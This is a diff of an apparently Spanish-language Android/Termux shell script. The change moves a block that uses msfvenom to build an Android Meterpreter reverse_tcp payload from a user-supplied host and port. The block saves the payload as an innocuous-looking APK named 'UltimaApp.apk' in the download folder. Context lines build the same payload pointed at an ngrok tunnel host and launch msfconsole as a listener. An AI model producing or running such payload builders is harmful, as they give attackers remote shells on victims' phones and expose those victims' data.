@@ -58,6 +58,18 @@ clear
 msfconsole -q -r $PREFIX/lib/config-base
 }
 function sess3 {
+if [ "$1" = "-a" ];then
+read -p "host : " host
+read -p "port : " puerto
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$puerto R > /sdcard/download/UltimaApp.apk
+clear
+printf "
+[ + ] El Payload se guardo en /sdcard/download/UltimaApp.apk
+[ + ] Con el Host $host
+[ + ] Con el puerto $puerto
+"
+exit
+fi
 if [ -x $HOME/SG/emerpay3 ];then
 rm -Rf emerpay3
 clear
@@ -85,17 +97,6 @@ else
 clear
 read -p "puerto: " puerto
 msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$puerto R > /sdcard/download/UltimaApp.apk
-fi
-if [ "$1" = "-a" ];then
-read -p "host : " host
-read -p "port : " puerto
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$host LPORT=$puerto R > /sdcard/download/UltimaApp.apk
-clear
-printf "
-[ + ] El Payload se guardo en /sdcard/download/UltimaApp.apk
-[ + ] Con el Host $host
-[ + ] Con el puerto $puerto
-"
 fi
 }
 function sess5 {
